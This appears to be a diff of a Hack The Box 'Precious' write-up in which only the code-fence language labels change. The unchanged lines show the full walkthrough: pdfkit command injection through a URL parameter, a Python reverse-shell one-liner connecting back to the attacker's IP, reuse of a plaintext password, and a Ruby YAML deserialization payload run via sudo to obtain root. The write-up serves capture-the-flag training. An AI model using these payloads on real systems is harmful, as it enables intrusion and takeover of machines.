@@ -34,7 +34,7 @@ Like every machine, we need to know how to access it. HTB gives us the IP addres
 
 First, we need to confirm that we can reach the IP:
 
-```powershell
+```bash
 ping -c 1 10.10.11.189
 	# PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
 	# 64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=72.5 ms
@@ -56,7 +56,7 @@ Before we start looking at the website, we can do a more powerful scan, using **
 
 This new command gives us more information. The web server redirects us to **http://precious.htb/**, but that website doesn't exist. We know the site is on this IP, but the web server wants us to access it through the URL **http://precious.htb/**. We can do that by telling our machine that the URL **http://precious.htb/** corresponds to the IP of the target machine. For that, we can edit the file **/etc/hosts** as a root (super user) and add the line:
 
-```powershell
+```bash
 echo "10.10.11.189\tprecious.htb" >> /etc/hosts
 ```
 
@@ -66,7 +66,7 @@ Now, we can access the website:
 
 It is a website that converts websites to PDF. We can do some basic testing to get more information about the website. We can try to serve a web server and enter the new URL to see what happens:
 
-```powershell
+```bash
 python -m http.server 80
 ```
 
@@ -84,7 +84,7 @@ We can see that the PDF Creator is a tool called **pdfkit v0.8.6**. This version
 
 > http://10.10.14.144/?name=%20`ping -c 1 10.10.14.144`
 
-```powershell
+```bash
 # Set up a listener to capture the ping
 sudo tcpdump -i tun0 icmp
 ```
@@ -104,13 +104,13 @@ while True:
 
 Now, we can try to get a reverse shell. A reverse shell is a type of connection to get a shell on the target machine. But the way we got this is tricky. We need to find a way for the target machine to send its own shell to our machine. It's like trying to enter a house, and we need to find a way for the house to open its own door to give us access... The command that worked on the machine was this:
 
-```powershell
+```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.144",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 So, if we want to do that on the Website, we need to send this url:
 
-```powershell
+```bash
 http://10.10.14.144/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.144",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
 ```
 
@@ -128,7 +128,7 @@ Digging through the folders and files, we'll find credentials for a service used
 
 And like 99,9% of people, we can try if the user henry has the same password for is user account. And it works!
 
-```powershell
+```bash
 su henry
 # Q3c1AqGHtoI0aXAYFH
 ```
@@ -145,7 +145,7 @@ The sudo command is a command to execute another command as root privileges. And
 
 We just create a file caller **test.txt** for confirm that the code is working. And it works! We can execute command as root. Now, we need a way to get root shell. They are so many ways, but I like this one: I will change permissions on the /usr/bin/bash program to execute it as the owner of the program. The owner of the program is root. So, if we execute the program, we will get a root shell. The code we will use is:
 
-```powershell
+```bash
 ---
 - !ruby/object:Gem::Installer
 	i: x
@@ -169,7 +169,7 @@ We just create a file caller **test.txt** for confirm that the code is working. 
 
 Now, we just need to execute the sudo command, and the **bash** program will be altered. And we can execute bash as root with a special flag:
 
-```powershell
+```bash
 sudo /usr/bin/ruby /opt/update_dependencies.rb
 bash -p
 ```
